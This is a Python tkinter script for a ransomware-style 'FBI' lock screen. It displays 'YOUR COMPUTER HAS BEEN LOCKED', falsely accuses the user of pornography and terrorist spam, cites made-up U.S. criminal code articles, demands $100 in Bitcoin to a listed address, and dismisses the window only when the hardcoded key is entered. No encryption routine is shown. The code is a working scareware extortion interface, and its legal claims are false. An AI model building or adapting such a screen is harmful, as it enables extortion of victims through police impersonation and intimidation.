from tkinter import *
from tkinter.font import Font, BOLD
import time


def gui(key):
    global state
    state = False
    # Initial Window Setup
    window = Tk()
    window.title("Piracy Warning!!!")
    window.geometry("1100x700")
    window.minsize(1100, 700)
    window.maxsize(1100, 700)
    window.config(bg='black')

    def click():
        global state
        print('click function running')
        check_text = entry.get()
        if check_text == key:
            pass_label = Label(window, text='Decrypting', foreground='red', background='black', font='Helvetica 18')
            pass_label.place(relx=0.8, rely=0.8)
            state = True
            window.destroy()

        elif check_text != key:
            warning_label = Label(window, text='Wrong Key !!!', foreground='red', background='black', font='Helvetica 18')
            warning_label.place(relx=0.8, rely=0.8)
            state = False


    # TITLE
    title = 'YOUR COMPUTER HAS BEEN LOCKED'
    title_font = Font(window, size=36, weight=BOLD)
    title_label = Label(window, text=title, font=title_font, foreground='red', background='black')
    title_label.place(relx=0.076, rely=0.065)

    # IMAGE
    img = PhotoImage(file='fbi.png')
    img_label = Label(window, image=img, background='black')
    img_label.place(relx=0.82, rely=0.2)

    # MESSAGE
    message = f"""
    This operating system is locked due to the violation of the federal laws of
    the United States of America! (Article 1, Section 8, Clause 8; Article 202;
    Article 210 of the Criminal Code of U.S.A. provides for a deprivation of
    liberty for four to twelve years.)

    Following violations were detected:
    Your IP address was used to visit websites containing pornography.
    Spam-messages with terrorist motives were also sent from your computer.
    This computer lock is aimed to stop your illegal activity.

    As a first time offender you are required to pay $100 USD.
    Send BitCoin to the following address:

    """
    msg_label = Label(window, text=message, foreground='green', background='black', font='Helvetica 18')
    msg_label.place(relx=0.07, rely=0.15)

    # ADDRESS
    address = 'Qh6jHed3sh9tUIstB1sR2fG40KoPrJd3'
    add_label = Label(window, text=address, foreground='black', background='white', font='Ariel 18')
    add_label.place(relx=0.275, rely=0.7)

    # EXTRA LABEL
    mess = 'Enter The Key:'
    key_label = Label(window, text=mess, foreground='green', background='black', font='Ariel 18')
    key_label.place(relx=0.07, rely=0.8)

    # ENTRY
    entry = Entry(window, width=40, background='white', fg='black', font='Ariel 18')
    entry.place(relx=0.235, rely=0.8)

    # BUTTON
    button = Button(window, text="OK", command=click, background='white', foreground='black', font='Ariel 14', width=300)
    button.config(width=1, height=1)
    button.place(relx=0.65, rely=0.8025)

    # TIMER
    time_label = Label(window, background='black', foreground='red', font='Helvetica 24')
    time_label.place(relx=0.8, rely=0.8)

    def digital_clock():
        text_input = time.strftime("%I:%M:%S %p")
        time_label.config(text=text_input)
        time_label.after(100, digital_clock)

    digital_clock()
    window.mainloop()
    return state


gui('hello')

